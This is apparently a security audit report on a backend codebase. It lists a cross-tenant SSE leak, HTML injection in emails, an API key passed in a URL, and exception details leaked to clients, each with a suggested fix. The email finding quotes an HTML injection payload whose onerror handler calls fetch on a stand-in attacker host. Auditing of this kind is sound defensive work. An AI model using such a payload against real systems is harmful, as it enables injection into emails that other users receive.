## HIGH: SEC-SSE-001 — Cross-Tenant SSE Leak

**File:** `storyengine/backend/routes/pipeline.py:51,1438`

`_running_tasks` is a global dict keyed only by `video_id`. When SSE clients connect without a `video_id` filter, line 1438 iterates ALL entries — no tenant check. Authenticated user from tenant A sees task progress from tenant B.

**Fix:** Scope the dict by `(tenant_id, video_id)` or filter by tenant before yielding.

## HIGH: SEC-EMAIL-001 — HTML Injection in Emails

**File:** `storyengine/backend/email_service.py:59,110,96-97`

User-controlled `display_name` is f-string interpolated directly into HTML email body. Attacker registers with `display_name='<img src=x onerror=fetch("//evil.com")'> ` and injects HTML into welcome/trial warning emails. Also affects `plan` and `amount_display` in billing receipt.

**Fix:** `import html; html.escape(display_name)` in all send_* functions.

## MEDIUM: SEC-KEYS-001a — Gemini Key in URL

**File:** `storyengine/backend/vault.py:326`

Gemini API key validation sends the key as `?key=VALUE` in the URL, which gets logged in server access logs.

**Fix:** Use `x-goog-api-key` header instead.

## MEDIUM: SEC-KEYS-001b — Exception Detail Leak

**Files:** `storyengine/backend/vault.py:356`, `storyengine/backend/routes/settings.py:231`

Raw `str(e)` returned to client, potentially leaking internal paths, library versions, connection strings.

**Fix:** Return generic "Validation error" message.
